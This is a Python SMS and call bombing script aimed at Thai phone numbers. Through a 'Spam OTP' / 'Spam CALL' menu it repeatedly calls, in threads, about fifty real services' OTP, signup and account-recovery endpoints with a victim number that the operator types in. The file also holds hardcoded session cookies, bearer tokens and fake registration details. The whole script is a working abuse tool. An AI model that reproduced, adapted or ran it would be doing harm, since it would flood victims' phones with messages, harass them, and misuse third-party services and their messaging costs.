import os, sys, time, requests, threading
from threading import Thread
from requests import post,Session
from datetime import date
from re import search

w = "\033[1;0m"
r = "\033[31m"
g = "\033[32m"

def api1():
	#sso
    try:
        jun = ('Mobile')
        req = requests.post(
            'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
            headers={
                "User-Agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "Content-Type":
                "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With":
                "XMLHttpRequest",
                "Cookie":
                "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
            },
            data=
            f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
        )
        if str(jun) in str(req.text):
        	pass
    except:
        pass

def api2():
    try:
    	#pt_max
        jun = ('phone')
        req = requests.get(
            f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )
        if str(jun) in str(req.text):
            pass
    except:
        pass

def api3():
    try:
    	#bugaboo
        jun = ('phone')
        req = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/signup/phone"
            },
            json={
                "ClientId":
                "6g47av6ddfcvi06v4l186c16d6",
                "Username":
                f"+66{phone[1:]}",
                "Password":
                "098098Az",
                "UserAttributes": [{
                    "Name": "name",
                    "Value": "Dbdh"
                }, {
                    "Name": "birthdate",
                    "Value": "2005-01-01"
                }, {
                    "Name": "gender",
                    "Value": "Male"
                }, {
                    "Name": "phone_number",
                    "Value": f"+66{phone[1:]}"
                }, {
                    "Name": "custom:phone_country_code",
                    "Value": "+66"
                }, {
                    "Name": "custom:is_agreement",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_consent",
                    "Value": "true"
                }, {
                    "Name": "custom:allow_person_info",
                    "Value": "true"
                }],
                "ValidationData": []
            })
        req1 = requests.post(
            "https://cognito-idp.ap-southeast-1.amazonaws.com/",
            headers={
                "cache-control": "max-age=0",
                "user-agent":
                "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                "content-type": "application/x-amz-json-1.1",
                "x-amz-target":
                "AWSCognitoIdentityProviderService.ResendConfirmationCode",
                "x-amz-user-agent": "aws-amplify/0.1.x js",
                "referer": "https://www.bugaboo.tv/members/resetpass/phone"
            },
            json={
                "ClientId": "6g47av6ddfcvi06v4l186c16d6",
                "Username": f"+66{phone[1:]}"
            })
        if str(jun) in str(req.text):
        	pass
    except:
        pass

def api4():
    try:
    	#myfave
        jun = ('phone')
        req = requests.post(
            "https://api.myfave.com/api/fave/v3/auth",
            headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
            json={"phone": "66" + phone})
        if str(jun) in str(req.text):
            pass
    except:
        pass

def api5():
    try:
    	#true-shopp
        jun = ('phone')
        req = requests.post(
            "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
            data={"username": phone})
        if str(jun) in str(req.text):
        	pass
    except:
        pass

def api6():
    try:
    	 # QCLONE
        jun = ('phone')
        req = requests.post("http://b226.com/x/code", data={f"phone": phone})
        if str(jun) in str(req.text):
            pass
    except:
        pass

def api8():
	try:
		requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
		pass
	except:
		pass
		
def api10():
	try:
		post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
		pass
	except:
		pass
		
def api11():
	try:
		post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
		pass
	except:
		pass
		
def api12():
	try:
		post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber": phone,
		"language": "th"},headers={"accept": "application/json, text/plain, /",
		"user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
		pass
	except:
		pass
		
def api13():
	try:
		post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
		pass
	except:
		pass
		
def api14():
    post("https://www.wongnai.com/_api/guest.json?_v=6.056&locale=th&_a=phoneLogIn",data={"phoneno":phone,

"retrycount":"0"

    },headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
    pass
    
def api15():
	try:
		post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":phone,"function":"enroll"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
		pass
	except:
		pass
		
def api16():
	try:
		requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
		pass
	except:
		pass
		
def api18():
	try:
		session = Session()
		ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
		session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})
		pass

	except:
		pass
		
def api19():
	head = {
       "Host": "u.icq.net",
       "content-length": "142",
       "accept": "*/*",
	   "content-type": "application/json",
	   "sec-ch-ua-mobile": "?1",
	   "user-agent": "Mozilla/5.0 (Linux; Android 5.1; OPPO F1s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	   "origin": "https://web.icq.com",
	   "sec-fetch-site": "cross-site",
	   "sec-fetch-mode": "cors",
	   "sec-fetch-dest": "empty"
	}
	try:
		requests.post("https://u.icq.net/api/v70/rapi/auth/sendCode", headers=head, json={"reqId":"84846-1645936701","params":{"phone":"66" +phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
		pass
	except:
		pass
		
def api22():
	try:
		post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
		pass
	except:
		pass
		
def api23():
	try:
		post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number":phone,
		})
		pass
	except:
		pass
		
def api24(): # TechCare
        try:
        	jun=('phone')
        	req = requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
        except:
        	pass

def api25(): # CMSMS
        try:
        	jun=('phone')
        	req = requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()
        except:
        	pass

def api27():
	try:
		jun=('phone') # SMSOTP
		req = requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
		if str(jun) in str(req.text):
			pass
	except:
		pass

def api28():
	try:
		requests.post("https://api.best-inc.co.th/account/sendlogincode", data={"phoneNumber": phone})
		pass
	except:
		pass
    
def api29():
	try:
		requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send",data={"tel": phone})
		pass
	except:
		pass
   
def api30():
	try:
		requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone": phone,"country_code":"TH"},headers={}).json()
		pass
	except:
		pass
	
def api31():
	try:
		requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone[1:]}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		pass
	except:
		pass
		
def api32():
	try:
		requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=660{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
	except:
		pass
		
def api33():
	try:
		headers = {
		    "organizationcode": "lifestyle",
		    "content-type": "application/json"
		    }
		json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
		requests.post("https://graph.firster.com/graphql",headers=headers,json=json)
	except:
		pass
		
def api34():
	try:
		head = {
		            "Host": "www.cpffeedonline.com",
		            "content-length": "529",
		            "accept": "*/*",
		            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		            "x-requested-with": "XMLHttpRequest",
		            "sec-ch-ua-mobile": "?1",
		            "user-agent": "Mozilla/5.0 (Linux; Android 5.1; OPPO F1s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
		            "origin": "https://www.cpffeedonline.com",
		            "sec-fetch-site": "same-origin",
		            "sec-fetch-mode": "cors",
		            "sec-fetch-dest": "empty",
		            "referer": "https://www.cpffeedonline.com/register",
		            "cookie": ".Nop.Antiforgery=CfDJ8IH-aakLgpNNhha3iUWRJwiKn893ITwuIr_iT9P-pUYMGWkUAJUjuHOBvuMqAD1K8U6hrfrPnwOkoQwFl9SjRvG9KTVH9tqPUM2rZ-ht1Qmvl7v-Qf5kHCGoAd0lrbwGKVpiipny4DnVOv--oCoBL34;_ga=GA1.1.24152376.1646877786;_fbp=fb.1.1646877789613.4710222;.Nop.Customer=794b69fd-ccb5-40e2-8cd2-0f0355f74498;_ga_60Z6H5W1EL=GS1.1.1646877785.1.1.1646877797.0"
		            }
		requests.post("https://www.cpffeedonline.com/Customer/RegisterRequestOTP", headers=head, data=f"mobileNumber={phone}")
	except:
		pass
		
def api35():
	try:
		headers = {
		    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..VhWRzxBqhLFbeTtPJEY94g.JuvIDguNII0mn7J0z5VaBk5sYd2tKCi8eJkXnmabc8t_8zrI-6Yx8cAGscoKBUp2KgIcehjlurht09Ps8z3sUMzMjQvgLdOoNArE0a1fQZFtEgz_LtkBwSmEVizo8nKSKQr8SjAU3lRu_oPPeGmqPw.FaRjuGVbezvxjbuLlIBrLw",
		    "content-type": "application/json; charset=utf-8"
		    }
		requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",headers=headers,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": "+66"+phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"Gsshhw shsvsv"}})
	except:
		pass
	
def api36():
	try:
		requests.post("https://allingame17.com/auth/send_otp",data="phone="+phone)
	except:
		pass
		
def api37():
	try:
		requests.post("https://api.dgashopqr.morchana.in.th/logins",json={"phoneNo": "66"+phone})
	except:
		pass

def api38():
	try:
		requests.get("https://findclone.ru/register?phone=+66"+phone,headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","Cookie": "_ym_uid=1636033155561007408; _ym_d=1636033155; ru.profsoft.findclone-smartbanner-closed=true; _ym_isad=2; _ym_visorc=w"}).json()
	except:
		pass
		
def api39():
	try:
		headers={
		    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
		    "x-requested-with": "XMLHttpRequest"
		    }
		requests.post("https://www.tgfone.com/index.php/signin/otp_chk",headers=headers,data=f"mobile=0{phone[1:]}&type_otp=3")
	except:
		pass
		
def api40():
	try:
		requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel": phone})
	except:
		pass
		
def api41():
	try:
		requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"},headers={})
	except:
		pass
		
def api42():
	try:
		requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
	except:
		pass
		
def api43():
	try:
		requests.post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", data={"number": "+66"+phone})
	except:
		pass
		
def api44():
	try:
		requests.post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", json={"Phone": phone})
	except:
		pass
		
def api45():
	try:
		requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})
	except:
		pass
		
def api46():
	try:
		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
	except:
		pass
		
def api47():
	try:
		requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone[1:]}")
	except:
		pass
		
def api48():
	try:
		requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number": phone})
	except:
		pass
		
def api49():
	try:
		session = Session()
		token = search("""<input type="hidden" name="_csrf" value="(.*)" />""",session.get("https://www.shopat24.com/register/").text).group(1)
		session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": token}, data={"phoneNumber": phone})
	except:
		pass
		
def api50():
	try:
		requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
	except:
		pass
		
def api51():
	try:
		requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": "+66"+phone})
	except:
		pass
		
def api52():
	try:
		requests.post("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number": phone})
	except:
		pass
		
def api53():
	try:
		requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
	except:
		pass

def api54():
	try:
		requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
	except:
		pass
		
def api55():
	try:
		requests.post("https://queenclub88.com/api/register/phone",data={"phone": phone})
	except:
		pass
		
def api56():
	try:
		requests.post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
	except:
		pass
		
def api57():
	try:
		headers={
		    "Accept": "application/json, text/javascript, */*; q=0.01",
		    "Content-Type": "application/json",
		    "Cookie": "zohocares-_zldp=YfEOFpfOAG8CH%2FfS1w7GAX11AU2f2EFVdJUwymD1YblY%2FKYS%2Fd4mHeR%2FLBiRxpHOACit%2FDUE7Go%3D; zohocares-_uuid=47aa2746-c2c7-49ba-a16d-f69274ad7963_b699; zohocares-_zldt=92727fc6-b980-4e4a-ab00-9cc660ea73fd-0; zft-sdc=isef%3Dtrue-isfr%3Dtrue-src%3Dgoogle; zps-tgr-dts=sc%3D3-expAppOnNewSession%3D%5B%5D-pc%3D3-sesst%3D1635733934067; e188bc05fe=4d6e62173a764ac5410d1192f41034cd; iamcsr=f3a833cd-4780-47bd-89cc-1eeb4b6a8769; _zcsr_tmp=f3a833cd-4780-47bd-89cc-1eeb4b6a8769; rct=f9041f5c-ec89-416a-90bc-e068a41254a0"
		    }
		json={"signup":{"firstname":"Hdhshehe","lastname":"","country_code":"TH","emailormobile": phone,"password":"2226HHfHahha$665&","x_contact_email":"snababha@gmail.com","country":"TH","tos":"true","newsletter":"true","otp":"","mode":"23","serviceurl":"/cpanel/hosting.do?plan=newMail5gb","servicename":"VirtualOffice"}}
		requests.post("https://accounts.zoho.com/webclient/v1/register/initiate",headers=headers,json=json)
	except:
		pass
		
def api58():
	head = {
	            "Host": "www.bigthailand.com",
	            "content-length": "136",
	            "accept": "application/json, text/plain, */*",
	            "content-type": "application/json",
	            "sec-ch-ua-mobile": "?1",
	            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	            "sec-ch-ua-platform": "Android",
	            "origin": "https://www.bigthailand.com",
	            "sec-fetch-site": "same-origin",
	            "sec-fetch-mode": "cors",
	            "sec-fetch-dest": "empty",
	            "referer": "https://www.bigthailand.com/login",
	            "cookie": "_gcl_au=1.1.723820426.1643691945;_ac_au_gt=1643691945634;_asm_uid=653773101;_fbp=fb.1.1643691957383.1644253645;_ac_client_id=653773209.1643691970;au_id=653773209;_asm_visitor_type=r;_hjSessionUser_2738378=eyJpZCI6IjI0ZjBjOGNhLTVjZWEtNWE3Ni04OWZkLWUyNGU0MWUzOTlhNiIsImNyZWF0ZWQiOjE2NDM2OTE5NTY4MDYsImV4aXN0aW5nIjp0cnVlfQ==;_gac_UA-165856282-1=1.1644738470.Cj0KCQiArt6PBhCoARIsAMF5waj_hkCe4-BkzDT30pB0B3qwe_xKwd2_LtX7E8DgYtiVeUQuLoUjtU8aAub2EALw_wcB;_gcl_aw=GCL.1645120161.CjwKCAiAgbiQBhAHEiwAuQ6Bkp20RyIPMOeEY-ScfXQ4f3nvC_nShMvJZuI58c7afoEYwoA9aksfBhoCdNMQAvD_BwE;auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..f59OD99kZxkzEkQk4x1EPQ.RiF8qhzt7JieP5hextin0Y9P8V9qPKUCwlm93Tvu3XVKAGvp0LiHjKddlD6vMXJ3M4tVLWCbAzQ865V9v-9c_lP_SjC9HoL9tP0xtBFE3c3NxXKbuBsyMU7lEPTrKPdpk9ZICR43PC4tSE3TCeHFDA.0BpR9DJqgK9iNYAV6YtaCA;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUuY29tIiwibWVkaXVtIjoicmVmZXJyZXIiLCJjYW1wYWlnbiI6IiIs%0D%0AImNvbnRlbnQiOiIiLCJ0ZXJtIjoiIiwidHlwZSI6InJlZmVycmVyIiwidGltZSI6MTY0NTUzNDg1%0D%0ANTM5NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExtTnZiUzF5WldabGNuSmxjaTB0TVRZME5UVXpORGcx%0D%0ATlRNNU5RPT0ifQ%3D%3D;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1645534855%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;cdp_session=1;_ga=GA1.2.856661019.1643691948;_gid=GA1.2.60066855.1645534859;popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-02-22T13%3A31%3A00.469Z%22%7D;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6IjBhZTZjOGRlLTQ0YzAtNDA0OS1hNjU4LTZmMjE1MzIyMjg1NyIsImNyZWF0ZWQiOjE2NDU1MzQ4NzE1NjIsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjCachedUserAttributes=eyJhdHRyaWJ1dGVzIjp7fSwidXNlcklkIjoiMjczODM3OCJ9;_ga_80VN88PBVD=GS1.1.1645534855.4.1.1645534873.42;OptanonConsent=isIABGlobal=false&datestamp=Tue+Feb+22+2022+20%3A01%3A14+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=41be2439-a8b7-4bc6-a2ee-4db6f745322a&interactionCount=0&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1&AwaitingReconsent=false;_pk_id.564990563.2c0e=653773209.1643691945.4.1645534877.1645534855.;_ac_an_session=znzmzgzlzrznzrzmzqznzdzjzdzizlznzmzmzgznzrzkzkzdzizdzizlznzmzmzgznzrzkzkzdzizlznzmzmzgznzrzkzkzdzizdzgzjzizdzjzd2h25zdzgzdzezizd"
	            }
	try:
		requests.post("https://www.bigthailand.com/authentication-service/user/OTP",headers=head,json={"locale":"th","phone":f"+66{phone[1:]}","email":"gtav2@gmail.com","userParams":{"buyerName":"aimbot god","activateLink":"www.google.com"}})
	except:
		pass

def call1():
	try:
		jun = ('phone')
		req = requests.post(
		    "https://api.myfave.com/api/fave/v3/auth",
		    headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
		    json={"phone": "66"+phone})
		if str(jun) in str(req.text):
			pass
	except:
		pass

def call2():
	try:
		jun = ('phone')
		req = requests.post(
		    "https://api.myfave.com/api/fave/v3/auth",
		    headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
		    json={"phone": "66" + phone})
		if str(jun) in str(req.text):
			pass
	except:
		pass

def banner_otp():
	print("  ___                     ___ _____ ___ ")
	print(" / __|_ __  __ _ __ __   / _ \_   _| _ \ ")
	print(" \__ \ '_ \/ _` |  '  \ | (_) || | |  _/")
	print(" |___/ .__/\__,_|_|_|_|  \___/ |_| |_|  ")
	print("     |_|                                ")
	
def banner_call():
	print("  ___                     ___   _   _    _    ")
	print(" / __|_ __  __ _ __ __   / __| /_\ | |  | |   ")
	print(" \__ \ '_ \/ _` |  '  \ | (__ / _ \| |__| |__ ")
	print(" |___/ .__/\__,_|_|_|_|  \___/_/ \_\____|____|")
	print("     |_|                                      ")
	
def funtion():
	print()
	print(f"<{r}#####{w} Funtion MENU {r}#####{w}>")
	print("[1] Enter 1 to Spam OTP")
	print("[2] Enter 2 to Spam CALL")
	

funtion()
key = input(f"{w}[{r}#{w}]{r}${w}> Select funtion : {r}")
print()
if key == "1" or key == "01":
	os.system("clear")
	banner_otp()
	phone = input(f"{w}[{r}#{w}]{r}${w}> Phone : {r}")
	num = int(input(f"{w}[{r}#{w}]{r}${w}> Amount : {r}"))
	print()
	useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
	user = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
	
	for i in range(num):
		time.sleep(1)
		threading.Thread(target=api1).start()
		threading.Thread(target=api2).start()
		threading.Thread(target=api3).start()
		threading.Thread(target=api4).start()
		threading.Thread(target=api5).start()
		threading.Thread(target=api6).start()
		threading.Thread(target=api8).start()
		threading.Thread(target=api10).start()
		threading.Thread(target=api11).start()
		threading.Thread(target=api12).start()
		threading.Thread(target=api13).start()
		threading.Thread(target=api14).start()
		threading.Thread(target=api15).start()
		threading.Thread(target=api16).start()
		threading.Thread(target=api18).start()
		threading.Thread(target=api19).start()
		threading.Thread(target=api22).start()
		threading.Thread(target=api23).start()
		threading.Thread(target=api24).start()
		threading.Thread(target=api25).start()
		threading.Thread(target=api27).start()
		threading.Thread(target=api28).start()
		threading.Thread(target=api29).start()
		threading.Thread(target=api30).start()
		threading.Thread(target=api31).start()
		threading.Thread(target=api33).start()
		threading.Thread(target=api32).start()
		threading.Thread(target=api34).start()
		threading.Thread(target=api35).start()
		threading.Thread(target=api36).start()
		threading.Thread(target=api37).start()
		threading.Thread(target=api38).start()
		threading.Thread(target=api39).start()
		threading.Thread(target=api40).start()
		threading.Thread(target=api41).start()
		threading.Thread(target=api42).start()
		threading.Thread(target=api43).start()
		threading.Thread(target=api44).start()
		threading.Thread(target=api45).start()
		threading.Thread(target=api46).start()
		threading.Thread(target=api47).start()
		threading.Thread(target=api48).start()
		threading.Thread(target=api49).start()
		threading.Thread(target=api50).start()
		threading.Thread(target=api51).start()
		threading.Thread(target=api52).start()
		threading.Thread(target=api53).start()
		threading.Thread(target=api54).start()
		threading.Thread(target=api55).start()
		threading.Thread(target=api56).start()
		threading.Thread(target=api57).start()
		threading.Thread(target=api58).start()
		
if key == "2" or key == "02":
	os.system("clear")
	banner_call()
	phone_call = input(f"{w}[{r}#{w}]{r}${w}> Phone : {r}")
	num_call = int(input(f"{w}[{r}#{w}]{r}${w}> Amount : {r}"))
	print()
	for x in range(num_call):
		time.sleep(1)
		threading.Thread(target=call1).start()
		threading.Thread(target=call2).start()
